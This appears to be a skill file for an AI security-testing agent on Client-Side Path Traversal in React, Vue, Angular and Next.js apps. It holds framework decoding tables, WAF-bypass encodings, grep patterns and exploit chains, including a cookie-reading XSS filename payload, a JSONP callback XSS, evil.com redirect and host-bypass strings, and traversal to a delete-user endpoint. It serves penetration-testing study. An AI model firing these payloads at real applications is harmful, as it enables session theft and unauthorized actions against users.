---
name: cspt-xss
description: Client-Side Path Traversal — exploit CSR apps where URL parameters control fetch/XHR paths to inject cross-origin responses, achieve XSS, or chain with file upload and JSONP gadgets. Use when React/Vue/Angular SPA fetches API data using URL-derived path segments.
---

# Client-Side Path Traversal (CSPT)

## Pattern

CSR applications (React, Vue, Angular, Next.js client routes) that construct API fetch paths from URL parameters, hash fragments, or path segments. The fetch destination is attacker-controllable, enabling injection of arbitrary API responses into the rendering context.

**Preconditions:**
- SPA fetches data using a URL-derived value (query param, path segment, hash)
- The fetch path is not validated or allowlisted on the client
- The injected response is rendered in a security-sensitive context (innerHTML, dangerouslySetInnerHTML, framework template binding) OR hits a state-changing endpoint (CSRF-like)

## Injection Sources

Three sources feed attacker input into client-side fetch paths. Test all three:

| Source | Example | Decode behavior | Notes |
|---|---|---|---|
| Path params | `/settings/:userId` | Framework-dependent (see below) | Most impactful — devs flow path values directly into API paths |
| Query params | `?id=value` | Almost always decoded by URLSearchParams | Well-known vector, broadly tested |
| Hash fragments | `#/path/value` | Framework-dependent | Less explored, SPA routers often consume these |

## Framework-Specific Behavior

Quick-reference lookup — identify framework during recon, then read the matching bypass details below:

| Framework | Params decoded? | Double decode? | CSPT risk | Secondary (server-side)? | Key bypass |
|---|---|---|---|---|---|
| React Router (v6) | Yes (`useParams`) | Yes — uppercase `F` only | **High** | N/A | `%252F` (uppercase F) |
| Vue Router / Nuxt | Yes | No | **High** | N/A | `%2F` |
| Angular | Yes (`UrlSerializer`) | No | **Medium** | N/A | `%2F`, test custom serializer |
| Next.js (App Router) | No (neither client nor server) | No | **Low** | Manual `decodeURIComponent` only | 500-error oracle |
| SvelteKit | No (client) / varies (server) | No | **Low** | Verify per version | 500-error oracle |
| SolidStart | No | No | **Low** | No | — |
| Ember | Yes | No | **Medium** | N/A | `%2F` |

Each framework's router decodes path parameters differently. This determines which encoding bypasses work.

### React Router (v6) — HIGH RISK
- Two-stage decode: `decodePath()` runs `decodeURIComponent()` on path segments, then param extraction runs `paramValue.replace(/%2F/g, "/")` — no `i` flag, **uppercase F only**
- `%252F` (double-encoded, uppercase F) → `decodeURIComponent` yields `%2F` → regex replaces with `/` → **traversal succeeds**
- `%252f` (double-encoded, lowercase f) → `decodeURIComponent` yields `%2f` → regex misses it → **traversal fails**
- **Critical**: if you've only been testing `%2f`, you've been missing React vulns. Always test `%2F` (uppercase)
- **Note**: React Router v7 changed param handling — verify behavior on target version

### Vue Router / Nuxt — HIGH RISK
- Path parameters are decoded (single decode)
- `%2F` in path param → decoded to `/` → traversal succeeds
- Nuxt inherits Vue Router behavior, same risk

### Angular — MEDIUM RISK
- `UrlSerializer` calls `decodeURIComponent()` on path segments by default (similar to Vue Router)
- Custom `UrlSerializer` implementations may preserve encoded sequences — check target
- `%2F` decoded to `/` in default config → traversal succeeds
- **Untested edge cases**: lazy-loaded routes and auxiliary routes may handle encoding differently — treat as Vue-equivalent until confirmed on target

### Next.js (App Router) — LOW-MEDIUM RISK
- Neither `useParams()` (client) nor `await params` (server) auto-decode in current App Router versions
- Developers must manually call `decodeURIComponent()` — if they do, standard CSPT applies
- Returns **500 errors on invalid paths** — useful oracle for blind detection
- Test: `%2F..%2F` — 500 = path parsing attempted, 200 with `value/../value` = traversal resolved
- **Check target version**: older Next.js or Pages Router may behave differently

### SvelteKit — LOW RISK
- Client-side: does not auto-decode → safe from direct CSPT
- Server-side `params`: reported to auto-decode in some versions — verify on target
- Same 500-error oracle as Next.js

### SolidStart — LOW RISK
- Does not auto-decode paths
- No secondary traversal observed

### Ember — MEDIUM RISK
- Path decoding occurs
- Test standard encoded traversal sequences

## URL Normalization: fetch() vs XHR vs Browsers

### WHATWG URL Parser Tab/Newline Stripping

The WHATWG URL spec (used by `fetch()`, `new URL()`, and browser navigation) strips three characters during URL parsing:

**Stripped characters:** U+0009 (tab), U+000A (line feed), U+000D (carriage return)

**When:** Step 3 of the basic URL parser — after trimming leading/trailing control chars, before the state machine processes the URL. This means the entire URL is cleaned of these characters before any path resolution.

**The bypass chain works like this:**

```
Victim URL:  https://app.com/page/..%09%2Fadmin
                                     ^^
                                     tab (percent-encoded in victim URL)

Step 1: WAF inspects victim URL
        Sees: ..%09%2Fadmin — no ../ pattern match → PASSES

Step 2: Browser decodes victim URL for page navigation
        SPA router extracts param: "..\t/admin" (literal tab)

Step 3: App constructs fetch URL: fetch("/api/" + param)
        Input to fetch(): "/api/..\t/admin"

Step 4: WHATWG parser strips literal tab (step 3 of spec)
        Parsed URL: "/api/../admin"

Step 5: Path resolution normalizes: "/admin"
        Request sent: GET /admin
```

**Key insight:** The stripping applies to **literal** characters, not percent-encoded forms. The bypass works because `%09` in the victim URL is decoded to a literal tab by the browser, then stripped by fetch()'s URL parser. The WAF only sees the percent-encoded form and doesn't recognize the traversal pattern.

**Payload permutations** (in victim URL — all normalize to `../` after browser decode + WHATWG strip):
```
.%09./    .%0a./    .%0d./              single char variants
.%09.%09/ ..%0d%0a/ .%09%0a./          multi-char combos
%2e%09%2e%2f  %2e%09%2e/  .%09.%5c    mixed with other encoding
```

### fetch() vs XMLHttpRequest

| Behavior | fetch() | XMLHttpRequest |
|---|---|---|
| URL parser | WHATWG (strips literal tabs/newlines) | WHATWG (same stripping) |
| Redirect handling | `redirect: "follow"` (default), `"manual"`, `"error"` | Follows transparently (no control) |
| Cross-origin redirects | Taints response (opaque unless CORS) | Blocked unless CORS |
| JSONP handling | Returns raw text (no execution) | Returns raw text (no execution) |

**Axios** defaults to XHR in browsers (not fetch). Can be configured with fetch adapter via `adapter: "fetch"`. Server-side Axios (Node) uses `http` module with different URL handling.

**Neither fetch() nor XHR execute JSONP responses.** Axios's `transformResponse` runs `JSON.parse()` which silently fails on JSONP format and returns the raw string. The JSONP gadget works because the **SPA renders the raw response text** as HTML.

## Probe

### 1. Identify Client-Side Fetch Path Construction

Search for patterns where URL input flows into fetch/XHR paths:

```javascript
// Vulnerable patterns — URL-derived values in fetch paths
fetch(`/api/page/${pageId}`)                    // pageId from useParams()
fetch(`/api/content?slug=${params.slug}`)       // slug from route params
axios.get(`/api/v1/${resource}/${id}`)          // resource + id from URL
$.get(`/data/${window.location.hash.slice(1)}`) // hash fragment
```

**Detection with jxscout:**
```bash
jxscout-pro-v2 -c get-matches --kind fetch-url-injection
jxscout-pro-v2 -c get-matches --kind dynamic-api-path
```

**Manual grep patterns:**
```bash
# In downloaded JS bundles
rg 'fetch\s*\(`[^`]*\$\{' --type js
rg 'axios\.(get|post|put)\s*\(`[^`]*\$\{' --type js
rg '\.get\s*\([^)]*location\.' --type js
rg 'useParams|useSearchParams|this\.\$route\.params' --type js
```

### 2. Black-Box Detection (No Source Required)

Systematic approach when you don't have source access:

```
1. Find pages with dynamic paths:    /settings/username, /profile/12345
2. Replace dynamic segment:          /settings/booyakasha
3. Check proxy for API calls containing "booyakasha"
4. If reflected in API path → CSPT candidate
5. Test traversal:                   /settings/booyakasha%2f
6. Check if API path changes → confirmed source-to-sink
7. Assess impact: DOM insertion (XSS) or state-change (CSRF)
```

**Confirm HTML injection:** Use Caido match-and-replace to inject `<img src=x>` into the API response body. If the SPA renders the image, the sink is confirmed.

### 3. Path Traversal to Arbitrary Endpoint

```
Legit:    https://app.com/view?page=about
Fetch:    GET /api/page/about

Attack:   https://app.com/view?page=../../../api/admin/config
Fetch:    GET /api/page/../../../api/admin/config
Resolved: GET /api/admin/config
```

### 4. Encoding Bypass Matrix

Test in order — stop at first success, then try tab-stripping for WAF-protected targets:

| Encoding | Payload | Decoded by | Works against |
|---|---|---|---|
| Literal | `../` | — | No filtering |
| URL-encoded slash | `..%2F` | Browser/router | Basic string filter on `../` |
| URL-encoded dots | `%2e%2e/` | Browser/router | Filter on `..` |
| Full URL encoding | `%2e%2e%2f` | Browser/router | Filter on `../` and `..` |
| Double encoding | `..%252F` | React Router (double-decode) | Single-decode filters |
| Case-sensitive | `..%252F` vs `..%252f` | React Router regex `/%2F/g` | React — uppercase F ONLY |
| Tab injection | `.%09./` | WHATWG parser strips tab | WAF pattern matching |
| Newline injection | `.%0a./` | WHATWG parser strips LF | WAF pattern matching |
| CRLF injection | `.%0d%0a./` | WHATWG parser strips CRLF | WAF pattern matching |
| Mixed tab+encoding | `%2e%09%2e%2f` | WHATWG strip + URL decode | WAF + string filters |
| Backslash | `..%5c` | Windows/some parsers | Slash-only filters |
| Semicolon | `..;/` | Tomcat/Spring | Proxy-layer filters |
| Overlong UTF-8 | `..%c0%af` | IIS/legacy | Modern filters (rare) |

## Exploitation Gadgets

### Gadget 1: File Upload + CSPT = Stored XSS

If the application has file upload AND CSPT:

```
1. Upload file with XSS payload in metadata:
   POST /api/files/upload
   filename="<img src=x onerror=alert(document.cookie)>.png"

2. Note the file ID:
   {"id": "abc123", "filename": "<img src=x onerror=...>"}

3. CSPT to fetch file metadata:
   https://app.com/view?page=../../api/files/abc123

4. SPA fetches /api/files/abc123, renders filename → XSS
```

### Gadget 2: JSONP Endpoint

Same-origin or CDN JSONP endpoints become XSS sinks via CSPT:

```
# JSONP endpoint returns: <img src=x onerror=alert(1)>({"data": "..."})
# SPA dumps raw response into innerHTML → callback name renders as HTML

https://app.com/view?page=../../jsonp?callback=<img src=x onerror=alert(1)>
```

**Why this works:** Neither fetch() nor Axios execute JSONP callbacks. The response is a raw string. The SPA renders it via innerHTML — the attacker-controlled callback name becomes HTML.

### Gadget 3: Open Redirect + Cross-Origin Response

```
# Open redirect on same origin → attacker-controlled JSON
https://app.com/view?page=../../redirect?url=https://evil.com/xss.json
```

**Constraints:** Cross-origin fetches return opaque responses unless:
- Target has `Access-Control-Allow-Origin: *` or reflects origin
- Redirect stays same-origin (e.g., to an upload endpoint)

**Note:** If SPA uses `redirect: 'manual'`, it reads `Response.url` or `Location` header and navigates programmatically — this changes cross-origin behavior and may bypass the opaque response constraint.

### Gadget 4: State-Changing Endpoints (CSPT-to-CSRF)

CSPT isn't just about XSS. If you can traverse to a state-changing endpoint:

```
# Original: GET /api/user/{id} (read profile)
# Traversal: GET /api/user/../../admin/delete-user?id=victim

# If the API uses GET for state changes (bad practice but common):
https://app.com/profile/../../admin/delete-user?id=victim
```

Even POST-based APIs may be vulnerable if the SPA sends the traversed path as a POST with attacker-controlled body.

### Gadget 5: Secondary Context Path Traversal (Server-Side)

When server components pass decoded params into internal `fetch()` calls, blind server-side path traversal becomes possible. This applies when the server-side code manually calls `decodeURIComponent()` on params (or the framework auto-decodes — verify per framework version):

```
# Client param:     %2F..%2Finternal-api
# Server decodes:   /../internal-api
# Server fetch():   GET /api/../internal-api → /internal-api
```

**Detection oracle:**
- 500 error on invalid traversal → server attempted path resolution
- 200 with `value/../value` reconstructed → traversal resolved successfully

## CDN/CloudFront CORS Cache Consideration

If CDN caches API responses and the first request had no `Origin` header, the cached response lacks CORS headers. Subsequent cross-origin fetches get blocked.

**Workaround:** CSPT is strongest when traversal stays same-origin. Prefer same-origin gadgets (file upload, JSONP, state-change endpoints) over cross-origin chains.

## Severity Escalation

| CSPT chain | Impact | Severity |
|---|---|---|
| Traverse to read-only API | Info disclosure | Medium |
| + File upload with payload in metadata | Stored XSS | High |
| + JSONP endpoint with callback injection | Reflected XSS | High |
| + Open redirect to attacker JSON (CORS allows) | Reflected XSS | High |
| + State-changing endpoint | CSRF-equivalent | High-Critical |
| + Admin/privileged endpoint | Privilege escalation | Critical |
| + postMessage listener on target origin | XSS chain | Critical |

## Detection Checklist

- [ ] Identify framework (React/Vue/Angular/Next/Svelte) — determines decode behavior
- [ ] SPA uses URL params/path/hash to construct API fetch paths
- [ ] Path traversal sequences reach different API endpoints (check proxy)
- [ ] Test both `%2F` and `%2f` (React Router case sensitivity)
- [ ] Test tab injection (`.%09./`) for WAF-protected targets
- [ ] Fetched response rendered in innerHTML or framework equivalent
- [ ] Same-origin file upload exists with user-controlled metadata
- [ ] Same-origin JSONP endpoints exist
- [ ] Same-origin open redirect exists that fetch might follow
- [ ] State-changing endpoints reachable via traversal
- [ ] Server-side params (Next.js/SvelteKit) auto-decode — test secondary context

## Chain With

- self-xss-escalation — CSPT as the XSS primitive in escalation chains
- web-cache-deception-path — cache the CSPT-triggered response for persistence
- csp-bypass — if CSP blocks inline scripts, combine CSPT with JSONP/CDN gadgets
- dom-vulnerability-detection — trace source-to-sink for the fetch path
- unicode-normalization-bypass — NFKC normalization may decode traversal chars post-filter
- parser-differential-bypass — different layers parse the same URL differently

## URL Validation Bypass (for CSPT through validated fetch URLs)

When the SPA validates the constructed URL before fetching (e.g. allowlisted hosts), combine CSPT traversal with URL validation bypasses:

```
# Userinfo confusion — traverse then embed allowed host as userinfo
fetch("/api/" + param)  →  param = "../../evil.com%23@allowed.com"

# Backslash confusion — some URL parsers treat \ as path separator
param = "..%5C..%5Cevil.com"

# Fragment injection — parser sees allowed host after #
param = "../../evil.com%23@allowed.com/payload"

# Scheme-relative — bypass scheme validation
param = "../..//evil.com/xss.json"
```

See `ssrf-ip-filter-bypass` skill for the full URL validation bypass matrix (userinfo, backslash, fragment, scheme, DNS rebinding, open redirect chains). The same techniques apply when CSPT targets a fetch URL that undergoes host validation.

## Reference

- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
- https://blog.criticalthinkingpodcast.io/p/hackernotes-ep-168-client-side-path-traversals-across-every-framework-with-xssdoctor
- https://vitorfalcao.com/posts/hacking-high-profile-targets/
- https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/
- https://octagon.net/blog/2022/01/11/client-side-path-manipulation/
- https://url.spec.whatwg.org/#url-parsing (WHATWG URL spec — tab/newline stripping)
